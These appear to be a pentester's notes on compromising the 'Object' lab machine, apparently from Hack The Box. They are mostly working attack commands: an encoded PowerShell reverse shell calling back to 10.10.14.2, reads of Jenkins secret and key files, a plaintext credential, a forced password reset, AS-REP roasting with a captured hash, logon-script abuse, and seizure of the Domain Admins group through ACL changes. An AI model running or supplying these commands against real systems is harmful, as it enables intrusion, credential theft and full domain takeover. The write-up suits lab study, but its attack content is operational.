# Summary



## about target

tip:  10.129.96.147

hostname:  Object

Difficulty:  Hard



## about attack

+ writeowner on domain admins group
+ GenericWrite on user, change logon scripts.





**attack note**

```bash
Object / 10.129.96.147

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Mega Engines
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.43.v20210629)

---- Interesting
-- domain name, from web 80
object.htb

oliver:c1cdfun_d2434

---- Enum 
-- web 80
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 50 -u http://object.htb -o gobuster.log

-- web 8080 jenkins
register account, hack01:Password!

add project

execute windows batch command; no shell back, http or smb both
powershell -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTAuMTAuMTQuMicsOTAwMSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkKCg==

check firewall rules. all outbound block.
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block"; 

enum files.
powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\config.xml";
powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\identity.key.enc";
powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secret.key";
powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secret.key.not-so-secret";

powershell ls C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users;
powershell ls C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets;

powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml";
powershell -c "cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key";
powershell -c [convert]::ToBase64String((cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte));

decrypt
https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py

---- Foothold

-- oliver
evil-winrm -u oliver -p 'c1cdfun_d2434' -i $tip

wepas enum, nothing.

sharphound enum
sh.exe -c all

found some, oliver ForceChangePassword to smith.
Set-DomainUserPassword -Identity smith -AccountPassword (ConvertTo-SecureString 'Password!123' -AsPlainText -Force) -Verbose

-- shell smith
smith GenericWrite to user maria
set preauth to asrepoast
Get-ADUser Maria | Set-ADAccountControl -DoesNotRequirePreAuth $true
# not work
.\rb.exe asreproast /format:hashcat /outfile:hashes.asreproast /user:maria

use https://github.com/HarmJ0y/ASREPRoast
Get-ASREPHash -Username maria -verbose

$krb5asrep$maria@object.local:4cdc2a1baeb0cdf0478f4662dda33fe8$e301df158b17b5c99b2f3511aea0549032ba0a139d5a4ed66431f05be353e28182de9365e03ebcd7cfd7612679e2e0313df47f211a8aec4418a31c856e7e291635f3dc89721278654cfe4655dfedf0f5589138cd625b931749b138174b0fcc73fcd930408f02204cb158f30c2e50751e7e87a6283861133cba7650e80db4a4c0b70425cee4f97b9dfde97182f96d49883c349517130f7b77487cece47236edbc94bbc3c849de43cce6a66a57cadd795bf0493c8ab6fc0662140daf28d41587d7b74fe24a71f948a1739bdc4866923b99bdf8c859184ed0278191aba7ffd74648af8b76d2e9a724f866f76db0

crack failed.
hashcat -a 0 -m 18200 maria.asrephash ../rockyou.txt

change logon script. from hacktrick
# not work, set-domainobject not found.
Set-ADObject -SamAccountName maria -PropertyName scriptpath -PropertyValue "c:\temp\ping.ps1"

Set-DomainObject -Identity maria -SET @{scriptpath="C:\\temp\\ping.ps1"}

echo "c:\\temp\\wp.exe log=c:\\temp\\maria-wp.log" > cmd.ps1
echo "" >> cmd.ps1
echo "powershell -c ""gci -recurse \users\maria\desktop"" > c:\\temp\\desk.out" >> cmd.ps1

echo "copy \users\maria\desktop\engine.xls c:\temp\" > cmd.ps1

engines.xls, contains password
check password.
crackmapexec winrm $tip -u maria -p maria.pass

-- shell maria
writeowner on domain admins group

Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights Al
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
---- System

login with maria again, domain admins.

```







# Enum

## nmap scan



```bash
nmap -p- --min-rate=1000 -T4 -oN nmap.light $tip
export port=$(cat nmap.light | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//)
sudo nmap -A -O -p$port -sC -sV -T4 -oN nmap.heavy $tip

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Mega Engines
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.43.v20210629)
```



# Foothold





# Privesc





## proof

```bash


```



